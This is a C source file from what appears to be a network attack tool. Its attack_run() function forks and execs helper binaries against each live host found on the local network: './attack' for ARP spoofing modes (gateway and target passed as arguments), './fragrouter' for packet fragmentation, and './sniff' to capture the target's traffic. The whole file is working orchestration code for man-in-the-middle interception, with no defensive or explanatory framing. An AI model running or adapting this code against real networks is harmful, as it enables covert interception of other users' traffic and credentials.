#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include "nethack.h"

/***********************************************************
 * attack_run()
 **********************************************************/
int attack_run(handle *hand, struct in_addr ipaddr)
{
	int pid, retc;
	char mode[16], gateway[16], host[16];

	signal(SIGCHLD, SIG_IGN);

	retc = proc_chk(ipaddr);
	if (retc > 0)
	{
		//printf("already exist [%s]\n", inet_ntoa(ipaddr));
		return 0;
	}

	proc_add(ipaddr);
	printf("%s alive\n", inet_ntoa(ipaddr));

	memset(mode, 0x00, sizeof(mode));
	sprintf(mode, "%d", hand->mode);
	memset(gateway, 0x00, sizeof(gateway));
	memcpy(gateway, inet_ntoa(hand->gateway), strlen(inet_ntoa(hand->gateway)));
	memset(host, 0x00, sizeof(host));
	memcpy(host, inet_ntoa(ipaddr), strlen(inet_ntoa(ipaddr)));

	if (hand->mode & (MODE_ARP1 | MODE_ARP2 | MODE_PSND))
	{
		pid = fork();
		switch (pid)
		{
		case -1:
			return -1;
		case 0:
			/* child */
			execl("./attack", "./attack", mode, 
					hand->interface, gateway, host, NULL);
			printf("execl error\n");
			return -1;
		default:
			/* parent */
			break;
		}
	}

	/* parent */
	if (hand->mode & MODE_FRAG)
	{
		/*********************
		 * fragrouter
		 ********************/
		pid = fork();
		switch (pid)
		{
		case -1:
			return -1;
		case 0:
			/* child */
			execl("./fragrouter", "./fragrouter", hand->interface, host, NULL);
			printf("execl error\n");
			return -1;
		default:
			/* parent */
			break;
		}
	}

	if (hand->mode & MODE_SNIF)
	{
		/*********************
		 * sniff
		 ********************/
		pid = fork();
		switch (pid)
		{
		case -1:
			return -1;
		case 0:
			/* child */
			execl("./sniff", "./sniff",  hand->interface, host, NULL);
			printf("execl error\n");
			return -1;
		default:
			/* parent */
			break;
		}
	}

	return 0;
}
